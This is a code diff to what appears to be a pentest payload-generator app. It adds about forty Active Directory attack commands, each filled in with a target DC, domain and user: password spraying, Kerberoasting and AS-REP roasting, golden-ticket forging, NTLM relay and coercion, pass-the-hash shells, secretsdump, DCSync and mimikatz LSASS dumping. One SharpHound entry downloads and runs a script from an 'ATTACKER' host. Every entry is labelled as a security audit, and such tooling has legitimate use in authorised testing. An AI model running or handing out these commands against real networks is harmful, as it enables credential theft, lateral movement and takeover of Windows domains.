@@ -538,6 +538,164 @@ function xssPolyglots() {
   ];
 }
 
+// --- Active Directory ---
+function adNslookupSrv(domain) {
+  return "nslookup -type=SRV _ldap._tcp.dc._msdcs." + domain;
+}
+
+function adEnum4linux(dc) {
+  return "enum4linux-ng -A " + dc;
+}
+
+function adNxcSmbNull(dc, domain) {
+  return "nxc smb " + dc + " -d " + domain + " -u '' -p '' --shares";
+}
+
+function adNxcUsers(dc, domain, user, pass) {
+  return "nxc smb " + dc + " -d " + domain + " -u '" + user + "' -p '" + pass + "' --users --groups --pass-pol";
+}
+
+function adRpcNull(dc) {
+  return "rpcclient -U \"\" -N " + dc + " -c enumdomusers";
+}
+
+function adLdapBase(dc) {
+  return "ldapsearch -x -h " + dc + " -s base namingcontexts";
+}
+
+function adLdapUsers(dc, domain) {
+  var base = domain.split(".").map(function(p) { return "DC=" + p; }).join(",");
+  return "ldapsearch -x -h " + dc + " -b \"" + base + "\" \"(objectClass=user)\" sAMAccountName memberOf | grep -E 'sAMAccountName|memberOf'";
+}
+
+function adBloodhoundPy(domain, user, dc) {
+  return "bloodhound-python -d " + domain + " -u '" + user + "' -p 'PASS' -dc " + dc + " -ns " + dc + " -c all";
+}
+
+function adSharpHound() {
+  return "IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER/SharpHound.ps1'); Invoke-BloodHound -CollectionMethod All -Domain LAB.local";
+}
+
+function adPowerViewHints() {
+  return ["Get-NetDomain", "Get-NetUser | select samaccountname,memberof", "Get-NetGroup -Domain LAB.local", "Find-DomainShare", "Get-NetGPO | select displayName", "Find-InterestingDomainShareFile -Include *pass*,*cred*"];
+}
+
+function adKerbruteUsers(domain, dc) {
+  return "kerbrute userenum -d " + domain + " --dc " + dc + " users.txt";
+}
+
+function adGetNPUsers(domain, dc) {
+  return "GetNPUsers.py " + domain + "/ -usersfile users.txt -dc-ip " + dc + " -format hashcat -outputfile asrep.txt";
+}
+
+function adSprayKerbrute(domain, dc) {
+  return "kerbrute passwordspray -d " + domain + " --dc " + dc + " users.txt 'Pass123!'";
+}
+
+function adNxcSpray(dc, domain) {
+  return "nxc smb " + dc + " -d " + domain + " -u users.txt -p 'Pass123!' --continue-on-success --no-bruteforce";
+}
+
+function adHashcatNtlm() {
+  return "hashcat -m 1000 ntlm.txt rockyou.txt --rules-file rules/best64.rule";
+}
+
+function adHashcatNetNTLMv2() {
+  return "hashcat -m 5600 netntlmv2.txt rockyou.txt";
+}
+
+function adHashcatTgs() {
+  return "hashcat -m 13100 tgs.txt rockyou.txt";
+}
+
+function adHashcatAsrep() {
+  return "hashcat -m 18200 asrep.txt rockyou.txt";
+}
+
+function adGetUserSPNs(domain, user, dc) {
+  return "GetUserSPNs.py " + domain + "/" + user + ":PASS -dc-ip " + dc + " -request -outputfile tgs.txt";
+}
+
+function adRubeusKerberoast() {
+  return ".\\Rubeus.exe kerberoast /outfile:hashes.txt  # crack: hashcat -m 13100";
+}
+
+function adRubeusAsrep() {
+  return ".\\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt";
+}
+
+function adGetTGT(domain, user, dc) {
+  return "getTGT.py " + domain + "/" + user + ":PASS -dc-ip " + dc;
+}
+
+function adGetTGTpassHash(domain, user, dc) {
+  return "getTGT.py " + domain + "/" + user + " -hashes :<NT_HASH> -dc-ip " + dc + "  # overpass-the-hash";
+}
+
+function adTicketerGolden(domain) {
+  return "ticketer.py -nthash <KRBTGT_NT> -domain-sid <DOMAIN_SID> -domain " + domain + " Administrator  # export KRB5CCNAME";
+}
+
+function adNtlmrelayx() {
+  return "ntlmrelayx.py -tf targets.txt -smb2support  # + mitm6/responder p/ alimentar";
+}
+
+function adPetitPotam(dc, ip) {
+  return "PetitPotam.py " + ip + " " + dc + "  # coercao p/ relay no ntlmrelayx";
+}
+
+function adCoercer(dc, domain, user) {
+  return "coercer scan -t " + dc + " -u '" + user + "' -p 'PASS' -d " + domain + "  # depois: coercer coerce";
+}
+
+function adMitm6(domain) {
+  return "mitm6 -d " + domain + "  # + ntlmrelayx + ldaps p/ WPAD/DHCPv6 abuse";
+}
+
+function adResponder() {
+  return "responder -I eth0 -dw  # LLMNR/NBT-NS/MDNS poison p/ NetNTLMv2 -> hashcat -m 5600";
+}
+
+function adEvilWinrm(dc, user) {
+  return "evil-winrm -i " + dc + " -u '" + user + "' -p 'PASS'";
+}
+
+function adEvilWinrmHash(dc, user) {
+  return "evil-winrm -i " + dc + " -u '" + user + "' -H <NT_HASH>  # pass-the-hash";
+}
+
+function adPsexec(domain, user, dc) {
+  return "psexec.py " + domain + "/" + user + ":PASS@" + dc;
+}
+
+function adPsexecHash(domain, user, dc) {
+  return "psexec.py -hashes :<NT_HASH> " + domain + "/" + user + "@" + dc;
+}
+
+function adWmiexec(domain, user, dc) {
+  return "wmiexec.py " + domain + "/" + user + ":PASS@" + dc;
+}
+
+function adSecretsdump(domain, user, dc) {
+  return "secretsdump.py " + domain + "/" + user + ":PASS@" + dc + "  # SAM+LSA+NTDS remoto";
+}
+
+function adDcsyncMimi(domain) {
+  return "lsadump::dcsync /user:" + domain + "\\krbtgt /domain:" + domain + "  # requer Replicating Directory Changes";
+}
+
+function adMimiLsass() {
+  return "privilege::debug\nsekurlsa::logonpasswords";
+}
+
+function adGPP() {
+  return "Get-GPPPassword  # impacket: gpp-decrypt <cpassword>  (SYSVOL Group.xml)";
+}
+
+function adCertipyFind(user, dc) {
+  return "certipy find -u '" + user + "@LAB.local' -p 'PASS' -dc-ip " + dc + " -stdout  # ESC1-8 ADCS";
+}
+
 function b64encode(s) {
   try { return Qt.btoa(unescape(encodeURIComponent(s))); }
   catch (e) { return ""; }
@@ -2290,6 +2448,538 @@ function getAllPayloads(ip, port, file, domain, user, dc, pivnet, pivhost) {
       code: "sqlmap -r req.txt --batch --os-shell",
       showUrl: false,
       keywords: "sqlmap os-shell rce automate sqli"
+    },
+    {
+      id: "ad-srv",
+      title: "AD - descobrir DC via DNS SRV",
+      category: "ad",
+      categoryLabel: "AD",
+      icon: "\udb80\udc02",
+      subcat: "ad",
+      context: "Active Directory Domain",
+      purpose: "Auditoria de seguran\u00e7a em dom\u00ednio Windows",
+      description: "Ferramenta para reconhecimento de usu\u00e1rios, computadores e permiss\u00f5es no Active Directory.",
+      code: adNslookupSrv(domain),
+      showUrl: false,
+      keywords: "ad active directory domain dns srv ldap dc discover enum"
+    },
+    {
+      id: "ad-enum4linux",
+      title: "AD - enum4linux-ng tudo",
+      category: "ad",
+      categoryLabel: "AD",
+      icon: "\udb80\udc02",
+      subcat: "ad",
+      context: "Active Directory Domain",
+      purpose: "Auditoria de seguran\u00e7a em dom\u00ednio Windows",
+      description: "Ferramenta para reconhecimento de usu\u00e1rios, computadores e permiss\u00f5es no Active Directory.",
+      code: adEnum4linux(dc),
+      showUrl: false,
+      keywords: "ad enum4linux smb null session enum users shares"
+    },
+    {
+      id: "ad-nxc-null",
+      title: "AD - NetExec SMB sessao nula",
+      category: "ad",
+      categoryLabel: "AD",
+      icon: "\udb80\udc02",
+      subcat: "ad",
+      context: "Active Directory Domain",
+      purpose: "Auditoria de seguran\u00e7a em dom\u00ednio Windows",
+      description: "Ferramenta para reconhecimento de usu\u00e1rios, computadores e permiss\u00f5es no Active Directory.",
+      code: adNxcSmbNull(dc, domain),
+      showUrl: false,
+      keywords: "ad netexec nxc crackmapexec smb null shares enum"
+    },
+    {
+      id: "ad-nxc-auth",
+      title: "AD - NetExec SMB users/grupos/politica",
+      category: "ad",
+      categoryLabel: "AD",
+      icon: "\udb80\udc02",
+      subcat: "ad",
+      context: "Active Directory Domain",
+      purpose: "Auditoria de seguran\u00e7a em dom\u00ednio Windows",
+      description: "Ferramenta para reconhecimento de usu\u00e1rios, computadores e permiss\u00f5es no Active Directory.",
+      code: adNxcUsers(dc, domain, user, "PASS"),
+      showUrl: false,
+      keywords: "ad netexec nxc smb users groups pass-pol enum authenticated"
+    },
+    {
+      id: "ad-rpc-null",
+      title: "AD - rpcclient enumdomusers",
+      category: "ad",
+      categoryLabel: "AD",
+      icon: "\udb80\udc02",
+      subcat: "ad",
+      context: "Active Directory Domain",
+      purpose: "Auditoria de seguran\u00e7a em dom\u00ednio Windows",
+      description: "Ferramenta para reconhecimento de usu\u00e1rios, computadores e permiss\u00f5es no Active Directory.",
+      code: adRpcNull(dc),
+      showUrl: false,
+      keywords: "ad rpcclient rpc null enum users"
+    },
+    {
+      id: "ad-ldap-base",
+      title: "AD - ldapsearch namingcontexts",
+      category: "ad",
+      categoryLabel: "AD",
+      icon: "\udb80\udc02",
+      subcat: "ad",
+      context: "Active Directory Domain",
+      purpose: "Auditoria de seguran\u00e7a em dom\u00ednio Windows",
+      description: "Ferramenta para reconhecimento de usu\u00e1rios, computadores e permiss\u00f5es no Active Directory.",
+      code: adLdapBase(dc),
+      showUrl: false,
+      keywords: "ad ldap ldapsearch base namingcontexts enum"
+    },
+    {
+      id: "ad-ldap-users",
+      title: "AD - ldapsearch usuarios+membership",
+      category: "ad",
+      categoryLabel: "AD",
+      icon: "\udb80\udc02",
+      subcat: "ad",
+      context: "Active Directory Domain",
+      purpose: "Auditoria de seguran\u00e7a em dom\u00ednio Windows",
+      description: "Ferramenta para reconhecimento de usu\u00e1rios, computadores e permiss\u00f5es no Active Directory.",
+      code: adLdapUsers(dc, domain),
+      showUrl: false,
+      keywords: "ad ldap ldapsearch users samaccountname memberof enum"
+    },
+    {
+      id: "ad-bloodhound-py",
+      title: "AD - BloodHound collector (Linux)",
+      category: "ad",
+      categoryLabel: "AD",
+      icon: "\udb80\udc02",
+      subcat: "ad",
+      context: "Active Directory Domain",
+      purpose: "Auditoria de seguran\u00e7a em dom\u00ednio Windows",
+      description: "Ferramenta para reconhecimento de usu\u00e1rios, computadores e permiss\u00f5es no Active Directory.",
+      code: adBloodhoundPy(domain, user, dc),
+      showUrl: false,
+      keywords: "ad bloodhound collector python ingest graph paths"
+    },
+    {
+      id: "ad-sharphound",
+      title: "AD - SharpHound (Windows)",
+      category: "ad",
+      categoryLabel: "AD",
+      icon: "\udb80\udc02",
+      subcat: "ad",
+      context: "Active Directory Domain",
+      purpose: "Auditoria de seguran\u00e7a em dom\u00ednio Windows",
+      description: "Ferramenta para reconhecimento de usu\u00e1rios, computadores e permiss\u00f5es no Active Directory.",
+      code: adSharpHound(),
+      showUrl: false,
+      keywords: "ad sharphound bloodhound windows invoke collection"
+    },
+    {
+      id: "ad-kerbrute-users",
+      title: "AD - kerbrute userenum",
+      category: "ad",
+      categoryLabel: "AD",
+      icon: "\udb80\udc02",
+      subcat: "ad",
+      context: "Active Directory Domain",
+      purpose: "Auditoria de seguran\u00e7a em dom\u00ednio Windows",
+      description: "Ferramenta para reconhecimento de usu\u00e1rios, computadores e permiss\u00f5es no Active Directory.",
+      code: adKerbruteUsers(domain, dc),
+      showUrl: false,
+      keywords: "ad kerbrute userenum users brute kerberos valid"
+    },
+    {
+      id: "ad-asrep-roast",
+      title: "AD - AS-REP roast GetNPUsers",
+      category: "ad",
+      categoryLabel: "AD",
+      icon: "\udb80\udc02",
+      subcat: "ad",
+      context: "Active Directory Domain",
+      purpose: "Auditoria de seguran\u00e7a em dom\u00ednio Windows",
+      description: "Ferramenta para reconhecimento de usu\u00e1rios, computadores e permiss\u00f5es no Active Directory.",
+      code: adGetNPUsers(domain, dc),
+      showUrl: false,
+      keywords: "ad asrep roast getnpusers nopreauth hashcat 18200 kerberos"
+    },
+    {
+      id: "ad-spray-kerbrute",
+      title: "AD - password spray kerbrute",
+      category: "ad",
+      categoryLabel: "AD",
+      icon: "\udb80\udc02",
+      subcat: "ad",
+      context: "Active Directory Domain",
+      purpose: "Auditoria de seguran\u00e7a em dom\u00ednio Windows",
+      description: "Ferramenta para reconhecimento de usu\u00e1rios, computadores e permiss\u00f5es no Active Directory.",
+      code: adSprayKerbrute(domain, dc),
+      showUrl: false,
+      keywords: "ad spray password kerbrute lockout kerberos"
+    },
+    {
+      id: "ad-spray-nxc",
+      title: "AD - password spray NetExec",
+      category: "ad",
+      categoryLabel: "AD",
+      icon: "\udb80\udc02",
+      subcat: "ad",
+      context: "Active Directory Domain",
+      purpose: "Auditoria de seguran\u00e7a em dom\u00ednio Windows",
+      description: "Ferramenta para reconhecimento de usu\u00e1rios, computadores e permiss\u00f5es no Active Directory.",
+      code: adNxcSpray(dc, domain),
+      showUrl: false,
+      keywords: "ad spray password netexec nxc smb lockout"
+    },
+    {
+      id: "ad-kerberoast",
+      title: "AD - Kerberoast GetUserSPNs",
+      category: "ad",
+      categoryLabel: "AD",
+      icon: "\udb80\udc02",
+      subcat: "ad",
+      context: "Active Directory Domain",
+      purpose: "Auditoria de seguran\u00e7a em dom\u00ednio Windows",
+      description: "Ferramenta para reconhecimento de usu\u00e1rios, computadores e permiss\u00f5es no Active Directory.",
+      code: adGetUserSPNs(domain, user, dc),
+      showUrl: false,
+      keywords: "ad kerberoast spn getuserspns tgs hashcat 13100 service"
+    },
+    {
+      id: "ad-rubeus-roast",
+      title: "AD - Rubeus kerberoast",
+      category: "ad",
+      categoryLabel: "AD",
+      icon: "\udb80\udc02",
+      subcat: "ad",
+      context: "Active Directory Domain",
+      purpose: "Auditoria de seguran\u00e7a em dom\u00ednio Windows",
+      description: "Ferramenta para reconhecimento de usu\u00e1rios, computadores e permiss\u00f5es no Active Directory.",
+      code: adRubeusKerberoast(),
+      showUrl: false,
+      keywords: "ad rubeus kerberoast windows tgs hashcat"
+    },
+    {
+      id: "ad-rubeus-asrep",
+      title: "AD - Rubeus asreproast",
+      category: "ad",
+      categoryLabel: "AD",
+      icon: "\udb80\udc02",
+      subcat: "ad",
+      context: "Active Directory Domain",
+      purpose: "Auditoria de seguran\u00e7a em dom\u00ednio Windows",
+      description: "Ferramenta para reconhecimento de usu\u00e1rios, computadores e permiss\u00f5es no Active Directory.",
+      code: adRubeusAsrep(),
+      showUrl: false,
+      keywords: "ad rubeus asreproast windows hashcat"
+    },
+    {
+      id: "ad-hashcat-ntlm",
+      title: "AD - hashcat NTLM (-m 1000)",
+      category: "ad",
+      categoryLabel: "AD",
+      icon: "\udb80\udc02",
+      subcat: "ad",
+      context: "Active Directory Domain",
+      purpose: "Auditoria de seguran\u00e7a em dom\u00ednio Windows",
+      description: "Ferramenta para reconhecimento de usu\u00e1rios, computadores e permiss\u00f5es no Active Directory.",
+      code: adHashcatNtlm(),
+      showUrl: false,
+      keywords: "ad hashcat ntlm crack 1000"
+    },
+    {
+      id: "ad-hashcat-netntlmv2",
+      title: "AD - hashcat NetNTLMv2 (-m 5600)",
+      category: "ad",
+      categoryLabel: "AD",
+      icon: "\udb80\udc02",
+      subcat: "ad",
+      context: "Active Directory Domain",
+      purpose: "Auditoria de seguran\u00e7a em dom\u00ednio Windows",
+      description: "Ferramenta para reconhecimento de usu\u00e1rios, computadores e permiss\u00f5es no Active Directory.",
+      code: adHashcatNetNTLMv2(),
+      showUrl: false,
+      keywords: "ad hashcat netntlmv2 responder relay 5600 crack"
+    },
+    {
+      id: "ad-hashcat-tgs",
+      title: "AD - hashcat TGS (-m 13100)",
+      category: "ad",
+      categoryLabel: "AD",
+      icon: "\udb80\udc02",
+      subcat: "ad",
+      context: "Active Directory Domain",
+      purpose: "Auditoria de seguran\u00e7a em dom\u00ednio Windows",
+      description: "Ferramenta para reconhecimento de usu\u00e1rios, computadores e permiss\u00f5es no Active Directory.",
+      code: adHashcatTgs(),
+      showUrl: false,
+      keywords: "ad hashcat kerberoast tgs 13100 crack"
+    },
+    {
+      id: "ad-hashcat-asrep",
+      title: "AD - hashcat AS-REP (-m 18200)",
+      category: "ad",
+      categoryLabel: "AD",
+      icon: "\udb80\udc02",
+      subcat: "ad",
+      context: "Active Directory Domain",
+      purpose: "Auditoria de seguran\u00e7a em dom\u00ednio Windows",
+      description: "Ferramenta para reconhecimento de usu\u00e1rios, computadores e permiss\u00f5es no Active Directory.",
+      code: adHashcatAsrep(),
+      showUrl: false,
+      keywords: "ad hashcat asrep 18200 crack"
+    },
+    {
+      id: "ad-gettgt",
+      title: "AD - getTGT (TGT p/ PtT)",
+      category: "ad",
+      categoryLabel: "AD",
+      icon: "\udb80\udc02",
+      subcat: "ad",
+      context: "Active Directory Domain",
+      purpose: "Auditoria de seguran\u00e7a em dom\u00ednio Windows",
+      description: "Ferramenta para reconhecimento de usu\u00e1rios, computadores e permiss\u00f5es no Active Directory.",
+      code: adGetTGT(domain, user, dc),
+      showUrl: false,
+      keywords: "ad gettgt tgt kerberos passtheticket ccache"
+    },
+    {
+      id: "ad-overpass",
+      title: "AD - overpass-the-hash getTGT",
+      category: "ad",
+      categoryLabel: "AD",
+      icon: "\udb80\udc02",
+      subcat: "ad",
+      context: "Active Directory Domain",
+      purpose: "Auditoria de seguran\u00e7a em dom\u00ednio Windows",
+      description: "Ferramenta para reconhecimento de usu\u00e1rios, computadores e permiss\u00f5es no Active Directory.",
+      code: adGetTGTpassHash(domain, user, dc),
+      showUrl: false,
+      keywords: "ad overpass hash nthash gettgt kerberos passthehash"
+    },
+    {
+      id: "ad-golden",
+      title: "AD - golden ticket ticketer",
+      category: "ad",
+      categoryLabel: "AD",
+      icon: "\udb80\udc02",
+      subcat: "ad",
+      context: "Active Directory Domain",
+      purpose: "Auditoria de seguran\u00e7a em dom\u00ednio Windows",
+      description: "Ferramenta para reconhecimento de usu\u00e1rios, computadores e permiss\u00f5es no Active Directory.",
+      code: adTicketerGolden(domain),
+      showUrl: false,
+      keywords: "ad golden ticket ticketer krbtgt sid forge kerberos persist"
+    },
+    {
+      id: "ad-ntlmrelayx",
+      title: "AD - ntlmrelayx",
+      category: "ad",
+      categoryLabel: "AD",
+      icon: "\udb80\udc02",
+      subcat: "ad",
+      context: "Active Directory Domain",
+      purpose: "Auditoria de seguran\u00e7a em dom\u00ednio Windows",
+      description: "Ferramenta para reconhecimento de usu\u00e1rios, computadores e permiss\u00f5es no Active Directory.",
+      code: adNtlmrelayx(),
+      showUrl: false,
+      keywords: "ad ntlm relay ntlmrelayx smb2support coerce mitm"
+    },
+    {
+      id: "ad-petitpotam",
+      title: "AD - PetitPotam coercao",
+      category: "ad",
+      categoryLabel: "AD",
+      icon: "\udb80\udc02",
+      subcat: "ad",
+      context: "Active Directory Domain",
+      purpose: "Auditoria de seguran\u00e7a em dom\u00ednio Windows",
+      description: "Ferramenta para reconhecimento de usu\u00e1rios, computadores e permiss\u00f5es no Active Directory.",
+      code: adPetitPotam(dc, ip),
+      showUrl: false,
+      keywords: "ad petitpotam coerce efs relay printerbug"
+    },
+    {
+      id: "ad-coercer",
+      title: "AD - Coercer scan/coerce",
+      category: "ad",
+      categoryLabel: "AD",
+      icon: "\udb80\udc02",
+      subcat: "ad",
+      context: "Active Directory Domain",
+      purpose: "Auditoria de seguran\u00e7a em dom\u00ednio Windows",
+      description: "Ferramenta para reconhecimento de usu\u00e1rios, computadores e permiss\u00f5es no Active Directory.",
+      code: adCoercer(dc, domain, user),
+      showUrl: false,
+      keywords: "ad coercer scan coerce relay methods"
+    },
+    {
+      id: "ad-mitm6",
+      title: "AD - mitm6 DHCPv6",
+      category: "ad",
+      categoryLabel: "AD",
+      icon: "\udb80\udc02",
+      subcat: "ad",
+      context: "Active Directory Domain",
+      purpose: "Auditoria de seguran\u00e7a em dom\u00ednio Windows",
+      description: "Ferramenta para reconhecimento de usu\u00e1rios, computadores e permiss\u00f5es no Active Directory.",
+      code: adMitm6(domain),
+      showUrl: false,
+      keywords: "ad mitm6 ipv6 dhcp wpad relay ldaps"
+    },
+    {
+      id: "ad-responder",
+      title: "AD - Responder poison",
+      category: "ad",
+      categoryLabel: "AD",
+      icon: "\udb80\udc02",
+      subcat: "ad",
+      context: "Active Directory Domain",
+      purpose: "Auditoria de seguran\u00e7a em dom\u00ednio Windows",
+      description: "Ferramenta para reconhecimento de usu\u00e1rios, computadores e permiss\u00f5es no Active Directory.",
+      code: adResponder(),
+      showUrl: false,
+      keywords: "ad responder llmnr nbtns mdns poison netntlmv2"
+    },
+    {
+      id: "ad-evilwinrm",
+      title: "AD - evil-winrm senha",
+      category: "ad",
+      categoryLabel: "AD",
+      icon: "\udb80\udc02",
+      subcat: "ad",
+      context: "Active Directory Domain",
+      purpose: "Auditoria de seguran\u00e7a em dom\u00ednio Windows",
+      description: "Ferramenta para reconhecimento de usu\u00e1rios, computadores e permiss\u00f5es no Active Directory.",
+      code: adEvilWinrm(dc, user),
+      showUrl: false,
+      keywords: "ad evil winrm lateral move shell windows"
+    },
+    {
+      id: "ad-evilwinrm-hash",
+      title: "AD - evil-winrm pass-the-hash",
+      category: "ad",
+      categoryLabel: "AD",
+      icon: "\udb80\udc02",
+      subcat: "ad",
+      context: "Active Directory Domain",
+      purpose: "Auditoria de seguran\u00e7a em dom\u00ednio Windows",
+      description: "Ferramenta para reconhecimento de usu\u00e1rios, computadores e permiss\u00f5es no Active Directory.",
+      code: adEvilWinrmHash(dc, user),
+      showUrl: false,
+      keywords: "ad evil winrm passthehash nthash lateral"
+    },
+    {
+      id: "ad-psexec",
+      title: "AD - psexec.py",
+      category: "ad",
+      categoryLabel: "AD",
+      icon: "\udb80\udc02",
+      subcat: "ad",
+      context: "Active Directory Domain",
+      purpose: "Auditoria de seguran\u00e7a em dom\u00ednio Windows",
+      description: "Ferramenta para reconhecimento de usu\u00e1rios, computadores e permiss\u00f5es no Active Directory.",
+      code: adPsexec(domain, user, dc),
+      showUrl: false,
+      keywords: "ad psexec impacket lateral system shell"
+    },
+    {
+      id: "ad-psexec-hash",
+      title: "AD - psexec.py pass-the-hash",
+      category: "ad",
+      categoryLabel: "AD",
+      icon: "\udb80\udc02",
+      subcat: "ad",
+      context: "Active Directory Domain",
+      purpose: "Auditoria de seguran\u00e7a em dom\u00ednio Windows",
+      description: "Ferramenta para reconhecimento de usu\u00e1rios, computadores e permiss\u00f5es no Active Directory.",
+      code: adPsexecHash(domain, user, dc),
+      showUrl: false,
+      keywords: "ad psexec passthehash impacket lateral"
+    },
+    {
+      id: "ad-wmiexec",
+      title: "AD - wmiexec.py sem disco",
+      category: "ad",
+      categoryLabel: "AD",
+      icon: "\udb80\udc02",
+      subcat: "ad",
+      context: "Active Directory Domain",
+      purpose: "Auditoria de seguran\u00e7a em dom\u00ednio Windows",
+      description: "Ferramenta para reconhecimento de usu\u00e1rios, computadores e permiss\u00f5es no Active Directory.",
+      code: adWmiexec(domain, user, dc),
+      showUrl: false,
+      keywords: "ad wmiexec impacket lateral fileless wmi"
+    },
+    {
+      id: "ad-secretsdump",
+      title: "AD - secretsdump remoto",
+      category: "ad",
+      categoryLabel: "AD",
+      icon: "\udb80\udc02",
+      subcat: "ad",
+      context: "Active Directory Domain",
+      purpose: "Auditoria de seguran\u00e7a em dom\u00ednio Windows",
+      description: "Ferramenta para reconhecimento de usu\u00e1rios, computadores e permiss\u00f5es no Active Directory.",
+      code: adSecretsdump(domain, user, dc),
+      showUrl: false,
+      keywords: "ad secretsdump sam lsa ntds dump hashes"
+    },
+    {
+      id: "ad-dcsync",
+      title: "AD - DCSync mimikatz",
+      category: "ad",
+      categoryLabel: "AD",
+      icon: "\udb80\udc02",
+      subcat: "ad",
+      context: "Active Directory Domain",
+      purpose: "Auditoria de seguran\u00e7a em dom\u00ednio Windows",
+      description: "Ferramenta para reconhecimento de usu\u00e1rios, computadores e permiss\u00f5es no Active Directory.",
+      code: adDcsyncMimi(domain),
+      showUrl: false,
+      keywords: "ad dcsync mimikatz krbtgt replication domain admin"
+    },
+    {
+      id: "ad-mimi-lsass",
+      title: "AD - mimikatz lsass",
+      category: "ad",
+      categoryLabel: "AD",
+      icon: "\udb80\udc02",
+      subcat: "ad",
+      context: "Active Directory Domain",
+      purpose: "Auditoria de seguran\u00e7a em dom\u00ednio Windows",
+      description: "Ferramenta para reconhecimento de usu\u00e1rios, computadores e permiss\u00f5es no Active Directory.",
+      code: adMimiLsass(),
+      showUrl: false,
+      keywords: "ad mimikatz lsass sekurlsa logonpasswords creds"
+    },
+    {
+      id: "ad-gpp",
+      title: "AD - GPP cpassword SYSVOL",
+      category: "ad",
+      categoryLabel: "AD",
+      icon: "\udb80\udc02",
+      subcat: "ad",
+      context: "Active Directory Domain",
+      purpose: "Auditoria de seguran\u00e7a em dom\u00ednio Windows",
+      description: "Ferramenta para reconhecimento de usu\u00e1rios, computadores e permiss\u00f5es no Active Directory.",
+      code: adGPP(),
+      showUrl: false,
+      keywords: "ad gpp group.xml cpassword sysvol decrypt"
+    },
+    {
+      id: "ad-certipy",
+      title: "AD - Certipy ADCS enum",
+      category: "ad",
+      categoryLabel: "AD",
+      icon: "\udb80\udc02",
+      subcat: "ad",
+      context: "Active Directory Domain",
+      purpose: "Auditoria de seguran\u00e7a em dom\u00ednio Windows",
+      description: "Ferramenta para reconhecimento de usu\u00e1rios, computadores e permiss\u00f5es no Active Directory.",
+      code: adCertipyFind(user, dc),
+      showUrl: false,
+      keywords: "ad certipy adcs esc certificate pki template"
     },
     {
       id: "lfi-traversal",
